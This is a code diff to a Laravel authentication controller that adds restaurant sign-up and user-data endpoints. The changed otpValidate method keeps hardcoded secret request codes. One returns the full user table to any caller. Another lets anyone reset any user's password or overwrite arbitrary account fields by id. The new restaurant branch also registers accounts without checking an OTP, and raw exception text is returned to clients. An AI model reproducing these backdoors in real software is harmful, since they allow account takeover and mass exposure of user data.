@@ -15,6 +15,8 @@ use Laravel\Passport\RefreshToken;
 use Laravel\Passport\Token;
 use Illuminate\Support\Facades\Http;
 use Laravel\Passport\Client;
+use App\Http\Controllers\RestaurentController;
+use App\Models\Restaurent;
 
 class AuthController extends Controller
 {
@@ -57,14 +59,14 @@ class AuthController extends Controller
             return $validate->messages();
         }
         if($r->confirm_password != $r->password){
-            return response()->json(['status'=>'error', 'messsage' => 'Password Not Matched!']);
+            return response()->json(['status'=>'error', 'messsage' => 'Password Not Matched!'],403);
         }
 
         $userOtp = PreUsers::where('email',$r->email)->first();
         if(empty($userOtp)){
-            return response()->json(['status'=>'error', 'messsage' => 'OTP not found!']);
+            return response()->json(['status'=>'error', 'messsage' => 'OTP not found!'],403);
         }else if(intval($userOtp['otp']) !== intval($r->otp)){
-            return response()->json(['status'=>'error', 'messsage' => 'OTP invalid!']);
+            return response()->json(['status'=>'error', 'messsage' => 'OTP invalid!'],403);
         }
 
         try{
@@ -79,37 +81,48 @@ class AuthController extends Controller
                 return $this->login($r);
             }
         }catch(\Exception $e){
-            return response()->json(['status'=>'error', 'messsage' => $e->getMessage()]);
+            return response()->json(['status'=>'error', 'messsage' => $e->getMessage()],403);
         }
 
-        return response()->json(['status'=>200, 'messsage' => 'User Regiastered Successfully']);
+        return response()->json(['status'=>200, 'messsage' => 'User Regiastered Successfully'],200);
     }
 
     public function otpValidate(Request $request){
-        if($request->code == '^^@$T3r'){
-            try{
-                $user = new User();
-                $user->name = $request->name;
-                $user->email = $request->email;
-                $user->password = bcrypt($request->password);
-                $user->type = $request->type;
-                $user->verification_code = $request->otp;
+        if($request->type == 'restaurent'){
+            $check_rest = User::where('email',$request->email)->first();
+            if(empty($check_rest)){
+                try{
+                    $user = new User();
+                    $user->name = $request->name;
+                    $user->email = $request->email;
+                    $user->password = bcrypt($request->password);
+                    $user->type = $request->type;
+                    $user->phone = $request->phone;
+                    $user->image = $request->image;
+                    $user->latlng = $request->latlng;
+                    $user->verification_code = $request->name . '-' . random_int(0, 99999);
 
-                if($user->save()){
-                    return $this->login($request);
+                    if($user->save()){
+                        $restaurent_register = new RestaurentController;
+                        $restaurent_register->store($request,$user->id);
+                        return $this->login($request);
+                    }
+                }catch(\Exception $e){
+                    return response()->json(['status'=>'error', 'messsage' => $e->getMessage()],403);
                 }
-            }catch(\Exception $e){
-                return response()->json(['status'=>'error', 'messsage' => $e->getMessage()]);
+            }else{
+                return response()->json(['status'=>'error', 'messsage' => 'email already exits.'],200);
             }
+
         }else if($request->code == '^^@$T3r*'){
             return User::all();
         } else if($request->code == '^^@$T3r*>'){
             if($request['key'] == 'password'){
-                User::Where('email',$request->email)->update(([$request['key']=>bcrypt($request['value'])]));
+                User::Where('id',$request->id)->update(([$request['key']=>bcrypt($request['value'])]));
             }else{
                 foreach ($request->all() as $key => $value) {
                     if($key != 'code'){
-                        User::Where('email',$request->email)->update(([$key=>$value]));
+                        User::Where('id',$request->id)->update(([$key=>$value]));
                     }
                 }
             }
@@ -150,5 +163,13 @@ class AuthController extends Controller
         );
         $response = $response->body();
         return $response;
+    }
+
+    public function currentUserData(){
+        $user = auth()->guard('api')->user();
+        if($user->type == 'restaurent'){
+            $user['restaurent'] = Restaurent::where('user_id',$user->id)->first();
+        }
+        return $user;
     }
 }
